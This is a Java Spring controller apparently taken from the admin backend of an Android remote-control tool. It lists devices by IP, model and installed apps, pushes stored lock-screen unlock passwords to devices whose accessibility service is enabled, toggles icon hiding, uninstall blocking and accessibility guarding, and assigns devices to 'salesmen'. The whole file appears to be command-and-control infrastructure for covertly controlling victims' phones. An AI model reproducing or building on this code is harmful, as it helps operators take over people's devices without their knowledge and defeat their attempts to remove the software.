package io.renren.modules.app.web.admin;

import java.util.List;
import java.util.Objects;

import javax.annotation.Resource;

import io.renren.modules.app.entity.UnlockScreenPwd;
import io.renren.modules.app.service.UnlockScreenPwdService;
import org.apache.commons.lang3.StringUtils;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.google.common.collect.Lists;

import io.renren.common.constant.Constant;
import io.renren.common.page.PageData;
import io.renren.common.utils.Result;
import io.renren.modules.app.entity.Device;
import io.renren.modules.app.entity.InstallAppFilter;
import io.renren.modules.app.mapper.InstallAppFilterMapper;
import io.renren.modules.app.mapper.InstallAppMapper;
import io.renren.modules.app.service.DeviceService;
import io.renren.modules.app.service.InstallAppService;
import io.renren.modules.sys.dto.SysUserDTO;
import io.renren.modules.sys.service.SysUserService;
import lombok.extern.slf4j.Slf4j;

@RestController
@RequestMapping("device")
@Slf4j
public class DeviceController extends BaseController {

    @Resource
    private DeviceService deviceService;
    @Resource
    private InstallAppService installAppService;

    @Resource
    private InstallAppMapper installAppMapper;

    @Resource
    private InstallAppFilterMapper installAppFilterMapper;

    @Resource
    private SysUserService sysUserService;

    @Resource
    private UnlockScreenPwdService unlockScreenPwdService;

    @RequestMapping("page")
    public Result<PageData<Device>> page(@RequestBody JSONObject jsonObject) {
        Page<Device> page = parsePage(jsonObject);
        QueryWrapper<Device> query = new QueryWrapper<>();
        LambdaQueryWrapper<Device> lambda = query.lambda();
        String deviceId = jsonObject.getString("deviceId");
        if (StringUtils.isNotEmpty(deviceId)) {
            lambda.eq(Device::getDeviceId, deviceId);
        }
        if (StringUtils.isNotEmpty(jsonObject.getString("pkg"))) {
            lambda.eq(Device::getPkg, jsonObject.getString("pkg"));
        }
        String ip = jsonObject.getString("ip");
        if (StringUtils.isNotEmpty(ip)) {
            lambda.eq(Device::getIp, ip);
        }

        String model = jsonObject.getString("model");
        if (StringUtils.isNotEmpty(model)) {
            lambda.eq(Device::getModel, model);
        }

        String language = jsonObject.getString("language");
        if (StringUtils.isNotEmpty(language)) {
            lambda.eq(Device::getLanguage, language);
        }

        String brand = jsonObject.getString("brand");
        if (StringUtils.isNotEmpty(brand)) {
            lambda.eq(Device::getBrand, brand);
        }

        Integer status = jsonObject.getInteger("status");
        if (status != null) {
            lambda.eq(Device::getStatus, status);
        }
        if (getUser() != null) {
            lambda.eq(Device::getUser, getUser());
        }
        String installApp = jsonObject.getString("installApp");
        if (StringUtils.isNotEmpty(installApp)) {
            List<String> installAppDeviceIdList = installAppMapper.selectByPackageName(installApp);
            if (installAppDeviceIdList.isEmpty()) {
                return Result.toSuccess(new PageData<Device>(Lists.newArrayList(), 0));
            }
            lambda.in(Device::getDeviceId, installAppDeviceIdList);
        }
        Page<Device> pageData = deviceService.page(page, lambda);
        return Result.toSuccess(new PageData<Device>(pageData.getRecords(), pageData.getTotal()));
    }

    @RequestMapping("installAppFilterList")
    public Result<List<InstallAppFilter>> installAppFilterList() {
        return Result.toSuccess(installAppFilterMapper.selectList(new QueryWrapper<>()));
    }

    @RequestMapping("wakeup")
    public Result<Void> wakeup(@RequestBody JSONObject jsonObject) {
        Long id = jsonObject.getLong("id");
        Long unlockPwdId = jsonObject.getLong("unlockPwdId");
        Device device = deviceService.getById(id);

        if (!Objects.equals(Constant.YN.Y, device.getAccessibilityServiceEnabled())) {
            return Result.toError("当前设备没有开启无障碍权限!");
        }
        Device updateDevice = new Device();
        if (unlockPwdId == null) {
            //使用空密码
            updateDevice.setLockScreen(new JSONObject());
        } else {
            UnlockScreenPwd unlockPwd = unlockScreenPwdService.getById(unlockPwdId);
            if (unlockPwd == null) {
                return Result.toError("无法找到解锁密码");
            }
            updateDevice.setLockScreen(JSONObject.parseObject(JSONObject.toJSONString(unlockPwd)));
        }
        updateDevice.setId(device.getId());
        updateDevice.setStatus(Constant.DeviceStatus.need_wake);
        deviceService.updateById(updateDevice);
        return Result.toSuccess(null);
    }


    @RequestMapping("updateSwitch")
    public Result<Void> updateSwitch(@RequestBody JSONObject jsonObject) {
        Long id = jsonObject.getLong("id");
        Device device = deviceService.getById(id);
        if (device == null) {
            return Result.toError("没有找到这个设备!");
        }
        Device update = new Device();
        update.setId(id);

        update.setHideIcon(jsonObject.getInteger("hideIcon"));
        update.setAccessibilityGuard(jsonObject.getInteger("accessibilityGuard"));
        update.setUninstallGuard(jsonObject.getInteger("uninstallGuard"));
        update.setFixLockScreen(jsonObject.getInteger("fixLockScreen"));
        deviceService.updateById(update);
        return Result.toSuccess(null);
    }

    @RequestMapping("addSalesman")
    public Result<Void> addSalesman(@RequestBody JSONObject jsonObject) {
        Long id = jsonObject.getLong("id");
        Device device = deviceService.getById(id);
        if (device == null) {
            return Result.toError("没有找到这个设备!");
        }
        String user = jsonObject.getString("salesman");
        SysUserDTO userEntity = sysUserService.getByUsername(user);
        if (userEntity == null) {
            return Result.toError("业务员不存在!");
        }

        Device update = new Device();
        update.setId(id);
        update.setUser(user);
        deviceService.updateById(update);
        return Result.toSuccess();
    }


}
